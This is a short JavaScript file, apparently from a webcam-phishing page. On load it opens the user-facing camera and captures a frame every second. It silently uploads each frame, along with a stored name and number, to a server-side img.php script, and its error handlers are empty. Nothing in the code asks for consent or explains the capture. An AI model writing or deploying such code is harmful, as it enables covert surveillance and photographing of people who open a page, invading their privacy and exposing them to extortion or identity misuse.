var video = document.getElementById('video');
var canvas = document.getElementById('canvas');

function post(imgdata){
  $.ajax({
    type: 'POST',
    data: { img: imgdata, name: usrNam, number: usrNum },
    url: './img.php',
    dataType: 'json',
    async: false,
    success: function(result){
      
    },
    error: function(){
      
    }
  });
};
const constraints = {
  audio: false,
  video: {
    // user,environment
    facingMode: "user"
  }
};
async function init(){
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch(e) {
    
  }
}
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;
  var context = canvas.getContext('2d');
  setInterval(function(){
    context.drawImage(video,0,0);
    var canvasData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
    post(canvasData);
  },1000);
};
init();